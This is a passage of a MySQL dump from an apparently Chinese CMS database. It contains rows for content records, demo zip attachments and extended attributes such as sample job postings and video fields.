INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (59,77,1,2,6,1,'2016-09-26 10:22:24',0,0,0,2,2,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (61,77,1,2,6,1,'2016-09-26 10:29:06',0,0,0,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (63,77,1,2,6,1,'2016-09-26 10:30:05',0,0,0,2,2,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (69,90,1,1,4,1,'2016-09-26 16:37:28',0,1,1,2,16,0,1,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (71,91,1,1,4,1,'2016-09-27 09:47:27',0,1,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (72,90,1,2,4,1,'2016-09-27 10:18:46',0,1,1,2,4,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (100,93,1,2,4,1,'2016-10-10 11:09:06',0,1,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (101,91,1,2,4,1,'2016-10-10 11:16:31',0,1,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (102,90,1,1,4,1,'2016-10-10 11:19:18',0,1,1,2,16,0,39,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (103,90,1,1,4,1,'2016-10-10 11:21:37',0,1,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (104,93,1,1,4,1,'2016-10-10 11:27:17',0,1,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (105,91,1,1,4,1,'2016-10-10 11:28:52',0,1,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (106,91,1,1,4,1,'2016-10-10 11:30:54',0,1,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (107,91,1,1,4,1,'2016-10-10 11:32:35',0,1,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (108,91,1,1,4,1,'2016-10-10 11:34:05',0,1,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (109,91,1,1,4,1,'2016-10-10 11:35:26',0,1,1,2,16,0,21,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (110,91,1,1,4,1,'2016-10-10 11:36:32',0,1,1,2,4,0,1,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (111,75,1,2,1,1,'2016-10-10 11:45:47',0,0,0,2,16,0,0,12,12,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (112,75,1,2,1,1,'2016-10-10 11:48:08',0,0,0,2,17,0,0,16,18,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (113,75,1,4,1,1,'2016-10-10 11:50:03',0,0,0,2,29,0,0,13,11,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (114,76,1,2,5,1,'2016-10-10 13:11:12',0,0,1,2,18,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (115,76,1,2,5,1,'2016-10-10 13:15:37',0,0,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (116,76,1,2,5,1,'2016-10-10 13:19:22',0,0,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (117,76,1,2,5,1,'2016-10-10 13:22:07',0,0,0,2,18,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (118,76,1,2,5,1,'2016-10-10 13:23:50',0,0,0,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (119,76,1,2,5,1,'2016-10-10 13:26:38',0,0,0,2,2,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (120,76,1,2,5,1,'2016-10-10 13:35:17',0,0,0,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (121,77,1,2,6,1,'2016-10-10 13:38:11',1,1,1,2,2,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (122,77,1,2,6,1,'2016-10-10 13:40:05',0,1,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (123,77,1,2,6,1,'2016-10-10 13:41:03',0,1,1,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (124,77,1,2,6,1,'2016-10-10 13:42:48',0,0,0,2,2,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (125,77,1,2,6,1,'2016-10-10 13:44:47',0,0,0,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (126,77,1,2,6,1,'2016-10-10 13:46:01',0,0,0,2,2,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (127,77,1,2,6,1,'2016-10-10 13:46:26',0,0,0,2,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (128,77,1,2,6,1,'2016-10-10 13:46:52',0,0,0,1,1,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (129,77,1,2,6,1,'2016-10-10 13:47:24',0,0,0,2,18,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (130,75,1,1,1,1,'2016-10-10 13:51:07',1,0,0,2,22,1,0,12,12,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (131,75,1,1,1,1,'2016-10-10 13:54:05',0,0,0,1,17,0,0,15,13,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (132,75,1,1,1,1,'2016-10-10 13:55:46',0,0,0,1,7,2,0,1,1,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (140,79,1,1,8,1,'2016-10-10 14:27:44',0,0,0,2,18,0,0,0,0,1);
INSERT INTO `jc_content` (`content_id`,`channel_id`,`user_id`,`type_id`,`model_id`,`site_id`,`sort_date`,`top_level`,`has_title_img`,`is_recommend`,`status`,`views_day`,`comments_day`,`downloads_day`,`ups_day`,`score`,`recommend_level`) VALUES (141,76,1,2,5,1,'2016-10-11 09:44:23',0,0,0,0,2,0,0,0,0,1);

#
# Source for table jc_content_attachment
#

CREATE TABLE `jc_content_attachment` (
  `content_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL COMMENT '排列顺序',
  `attachment_path` varchar(255) NOT NULL COMMENT '附件路径',
  `attachment_name` varchar(100) NOT NULL COMMENT '附件名称',
  `filename` varchar(100) DEFAULT NULL COMMENT '文件名',
  `download_count` int(11) NOT NULL DEFAULT '0' COMMENT '下载次数',
  KEY `fk_jc_attachment_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容附件表';

#
# Dumping data for table jc_content_attachment
#

INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (69,0,'/u/cms/www/201609/261635496465.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (71,0,'/u/cms/www/201609/271002022fag.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (72,0,'/u/cms/www/201609/27102743993k.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (100,0,'/u/cms/www/201610/10110756cg7o.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (101,0,'/u/cms/www/201610/10111518cqda.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (102,0,'/u/cms/www/201610/10111758q1kj.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (103,0,'/u/cms/www/201610/101120397iez.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (104,0,'/u/cms/www/201610/10112554wirt.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (105,0,'/u/cms/www/201610/10112814u17l.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (106,0,'/u/cms/www/201610/101130257966.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (107,0,'/u/cms/www/201610/101131571wkz.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (108,0,'/u/cms/www/201610/101133341nc3.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (109,0,'/u/cms/www/201610/10113459gvbx.zip','演示.zip',NULL,0);
INSERT INTO `jc_content_attachment` (`content_id`,`priority`,`attachment_path`,`attachment_name`,`filename`,`download_count`) VALUES (110,0,'/u/cms/www/201610/101136270k36.zip','演示.zip',NULL,0);

#
# Source for table jc_content_attr
#

CREATE TABLE `jc_content_attr` (
  `content_id` int(11) NOT NULL,
  `attr_name` varchar(30) NOT NULL COMMENT '名称',
  `attr_value` varchar(255) DEFAULT NULL COMMENT '值',
  KEY `fk_jc_attr_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容扩展属性表';

#
# Dumping data for table jc_content_attr
#

INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (14,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (14,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (11,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (11,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (12,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (12,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (23,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (23,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (27,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (27,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (28,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (28,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (29,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (29,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (30,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (30,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (32,'pic1','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (32,'pic2','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (43,'education','专科');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (43,'nature','全职');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (43,'hasmanage','不要求');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (43,'deadline','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (43,'experience','1-3年');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (43,'salary','5000-8000');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (43,'category','项目主管');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (43,'workplace','南昌');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (43,'nums','1-3人');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (44,'education','专科');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (44,'nature','全职');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (44,'hasmanage','不要求');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (44,'deadline','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (44,'experience','1-3年');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (44,'salary','3000-5000');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (44,'category','项目主管');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (44,'workplace','上海');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (44,'nums','3-5人');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (45,'education','专科');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (45,'nature','全职');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (45,'hasmanage','不要求');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (45,'deadline','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (45,'experience','1-3年');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (45,'salary','1500-2000');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (45,'category','项目主管');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (45,'workplace','北京');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (45,'nums','5-10人');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (46,'education','专科');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (46,'nature','全职');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (46,'hasmanage','要求');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (46,'deadline','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (46,'experience','1-3年');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (46,'salary','面议');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (46,'category','项目主管');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (46,'workplace','广州');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (46,'nums','1-3人');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (47,'education','专科');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (47,'nature','全职');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (47,'hasmanage','不要求');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (47,'deadline','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (47,'experience','1-3年');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (47,'salary','1500-2000');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (47,'category','项目主管');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (47,'workplace','重庆');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (47,'nums','1-3人');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (48,'education','专科');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (48,'nature','全职');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (48,'hasmanage','不要求');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (48,'deadline','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (48,'experience','1-3年');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (48,'salary','5000-8000');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (48,'category','项目主管');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (48,'workplace','杭州');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (48,'nums','1-3人');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (49,'education','专科');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (49,'nature','兼职');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (49,'hasmanage','不要求');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (49,'deadline','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (49,'experience','1-3年');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (49,'salary','1500-2000');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (49,'category','项目主管');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (49,'workplace','重庆');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (49,'nums','1-3人');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (50,'education','专科');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (50,'nature','全职');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (50,'hasmanage','不要求');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (50,'deadline','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (50,'experience','1-3年');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (50,'salary','1500-2000');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (50,'category','项目主管');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (50,'workplace','南京');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (50,'nums','1-3人');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (51,'education','专科');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (51,'nature','全职');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (51,'hasmanage','不要求');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (51,'deadline','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (51,'experience','1-3年');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (51,'salary','2000-3000');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (51,'category','项目主管');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (51,'workplace','西安');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (51,'nums','1-3人');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (53,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (53,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (53,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (55,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (55,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (55,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (57,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (57,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (57,'Director','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (59,'Starring','');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (59,'Video','正片');
INSERT INTO `jc_content_attr` (`content_id`,`attr_name`,`attr_value`) VALUES (59,'Director','');
